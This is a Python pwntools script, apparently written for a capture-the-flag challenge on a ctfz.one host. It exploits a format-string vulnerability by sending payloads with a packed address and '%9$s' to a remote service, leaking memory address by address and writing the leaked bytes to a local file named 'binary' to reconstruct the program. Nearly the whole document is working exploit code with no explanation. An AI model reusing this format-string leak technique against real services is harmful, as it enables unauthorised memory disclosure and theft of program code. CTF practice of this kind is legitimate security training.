from pwn import *

# Run process
context.arch = 'x86'
#context.terminal = ['tmux','new-window']
#context.aslr = None



sizelim = 254

formatstring = "%x"

entrypoint = 0x40000000
entrypoint = 0x40010101
entrypoint = 0x080482f0



def asd(i):
    r = remote("pwn-03.v7frkwrfyhsjtbpfcppnu.ctfz.one",1234)
    r.sendline("3") # StrRemoveLastSymbols
    target = entrypoint+i
    r.sendline("AAAA"+p32(target)+ "BBBB" + "%9$s" + "CCCC")
    r.sendline("0")

    try:
        r.recvuntil("BBBB")
        #r.clean_and_log()
        output = r.recvuntil("CCCC")[:-4]
    except:
        output = '\xca'
        print "Crashed %x" % target

    r.close()
    return output
    

fd = open("binary","w")
i = 0


while True:
    leak = asd(i)
    i += len(leak)

    if len(leak) == 0:
        leak = "\0"
        i += 1

    print len(leak),":",leak

    fd.write(leak)
    fd.flush()
